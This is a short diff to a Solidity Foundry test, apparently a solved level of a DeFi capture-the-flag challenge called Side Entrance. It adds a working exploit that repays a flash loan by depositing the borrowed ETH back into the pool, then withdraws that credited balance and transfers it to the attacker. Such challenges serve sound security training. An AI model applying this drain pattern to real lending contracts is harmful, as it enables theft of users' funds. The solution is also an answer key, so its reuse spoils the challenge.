@@ -36,12 +36,21 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
+        sideEntranceLenderPool.withdraw();
         /**
          * EXPLOIT END *
          */
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+    }
+
+    function execute() external payable {
+        sideEntranceLenderPool.deposit{value: ETHER_IN_POOL}();
+    }
+
+    receive() external payable {
+        attacker.transfer(ETHER_IN_POOL);
     }
 
     function validation() internal {
